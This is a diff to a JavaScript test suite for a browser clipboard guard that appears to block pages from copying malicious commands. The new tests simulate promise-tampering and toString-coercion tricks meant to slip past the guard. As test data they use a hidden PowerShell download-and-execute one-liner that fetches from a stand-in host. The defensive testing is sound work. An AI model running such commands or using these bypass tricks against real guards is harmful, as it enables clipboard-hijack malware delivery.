@@ -326,6 +326,25 @@ const check = (name, condition, detail = "") => {
       (live.match(re) || [""])[0]);
   }
   check("forwarding uses a captured Reflect.apply", /nativeApply\(native, this/.test(guardSrc));
+  check("the promise constructor and then are captured", /const NativePromise = Promise;/.test(guardSrc) &&
+    /const nativeThen = Promise\.prototype\.then;/.test(guardSrc));
+  check("the guard never awaits a page-reachable promise",
+    !/\bawait\b|\basync\b/.test(live),
+    (live.match(/\bawait\b|\basync\b/) || [""])[0]);
+  check("every promise the guard consumes goes through the captured then",
+    !/[^,\s]\.then\(/.test(live) && /nativeApply\(nativeThen,/.test(guardSrc),
+    (live.match(/[^,\s]\.then\(/) || [""])[0]);
+  // Both nativeThen call sites must fail closed, so count them: reverting either
+  // one leaves the other matching and would pass a mere presence test.
+  check("every captured-then call site fails closed on a throw",
+    (guardSrc.match(/catch \{ return tamper\(\); \}/g) || []).length ===
+    (guardSrc.match(/nativeApply\(nativeThen, (?:blobPromise|textPromise)/g) || []).length &&
+    /const tamper = \(\) => \{/.test(guardSrc),
+    `${(guardSrc.match(/catch \{ return tamper\(\); \}/g) || []).length} tamper catch(es) for ` +
+    `${(guardSrc.match(/nativeApply\(nativeThen, (?:blobPromise|textPromise)/g) || []).length} consumed promise(s)`);
+  check("execCommand forwards the coerced command, not the original object",
+    /const args = \[cmd\];/.test(guardSrc) &&
+    !/\[command, \.\.\.rest\]/.test(guardSrc));
   check("coercion is type-checked, not assumed to return a string",
     /typeof out === "string" \? out : null/.test(guardSrc));
   check("sealSequence verifies its own descriptor", /d\.writable \|\| d\.configurable/.test(guardSrc));
@@ -552,6 +571,77 @@ const check = (name, condition, detail = "") => {
       check("a replaced Object.defineProperty is inert: benign still forwarded",
         forwardedBenign);
     }
+
+    // Promise interception. `await p` on a page-reachable promise is NOT a plain
+    // read of p's internal slots: it performs PromiseResolve(%Promise%, p), which
+    // does Get(p, "constructor") and only short-circuits when that is the
+    // intrinsic. Replace it and p is treated as a thenable, so Get(p, "then")
+    // decides the resolved value -- letting the page choose what the classifier
+    // inspects while the native still writes the item's real bytes.
+    {
+      const before = probe.write.length;
+      const realCtor = R.Promise.prototype.constructor;
+      const realThen = R.Promise.prototype.then;
+      let substitutions = 0;
+      try {
+        R.Promise.prototype.constructor = function NotPromise() {};
+        R.Promise.prototype.then = function (onFulfilled, onRejected) {
+          // Keep the real machinery so the harness still settles; swap only what
+          // an awaiter would be handed.
+          return R.Reflect.apply(realThen, this, [(value) => {
+            substitutions += 1;
+            return onFulfilled ? onFulfilled("Ray ID: 8f21c0") : value;
+          }, onRejected]);
+        };
+        click();
+        await clipboard.write(R.Array.of(new ctx.ClipboardItem({
+          "text/plain": 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"'
+        })));
+      } finally {
+        R.Promise.prototype.constructor = realCtor;
+        R.Promise.prototype.then = realThen;
+      }
+      check("a replaced promise constructor and then cannot swap what the classifier sees",
+        probe.write.length === before,
+        `forwarded ${probe.write.length - before} write(s); ${substitutions} substitution(s) offered`);
+    }
+
+    // The same lookup, used to break the guard rather than to lie to it.
+    // Promise.prototype.then performs SpeciesConstructor(p, %Promise%), so a
+    // constructor carrying a throwing @@species makes the captured `then` throw.
+    // Treating that as an unreadable item would warn and forward the payload.
+    {
+      const before = probe.write.length;
+      const realCtor = R.Promise.prototype.constructor;
+      const Hostile = function Hostile() {};
+      let armed = true;
+      // A throwing @@species getter is enough: SpeciesConstructor reads it, so
+      // the Get itself throws and then() throws with it. Disarmed it yields
+      // undefined, which SpeciesConstructor resolves to the intrinsic %Promise%.
+      R.Object.defineProperty(Hostile, Symbol.species, {
+        get() { if (armed) throw new R.Object(); return undefined; }
+      });
+      let settled;
+      try {
+        R.Promise.prototype.constructor = Hostile;
+        click();
+        // The guard consumes its first promise synchronously inside the executor,
+        // so the trap has already sprung by the time write() returns. Disarm
+        // before awaiting, so the harness's own then() still works and a revert
+        // shows up as this check failing rather than as an unhandled rejection
+        // that aborts the suite.
+        settled = clipboard.write(R.Array.of(new ctx.ClipboardItem({
+          "text/plain": "powershell -w hidden -nop -c calc"
+        })));
+      } finally {
+        armed = false;
+        R.Promise.prototype.constructor = realCtor;
+      }
+      try { await settled; } catch { /* a reverted guard rejects; the verdict is what matters */ }
+      check("a throwing promise species cannot downgrade a block into a forward",
+        probe.write.length === before,
+        `forwarded ${probe.write.length - before} write(s)`);
+    }
   }
 
   // A legitimate non-text item must still go through.
@@ -603,6 +693,27 @@ const check = (name, condition, detail = "") => {
     check("execCommand copy of ordinary text is forwarded untouched",
       plain === true && probe.execCommand.length === before + 2);
     ctx.document.activeElement = null;
+
+    // Coerce-once. A command whose toString changes between calls let the guard
+    // read "notcopy" and skip classification while the WebIDL DOMString
+    // conversion read "copy" and performed the copy unchecked. The native must
+    // receive the primitive the guard classified, so there is no second coercion.
+    {
+      const mark = probe.execCommand.length;
+      let coercions = 0;
+      const mutating = ctx.__realm.Object.create(null);
+      mutating.toString = () => (coercions++ === 0 ? "notcopy" : "copy");
+      ctx.document.activeElement = {
+        value: 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"'
+      };
+      click();
+      ctx.document.execCommand(mutating);
+      const forwarded = probe.execCommand[probe.execCommand.length - 1];
+      check("execCommand coerces the command once and forwards that primitive",
+        coercions === 1 && typeof forwarded === "string" && forwarded === "notcopy",
+        `coerced ${coercions} time(s), native got ${typeof forwarded}: ${String(forwarded)}`);
+      ctx.document.activeElement = null;
+    }
   }
 }
 
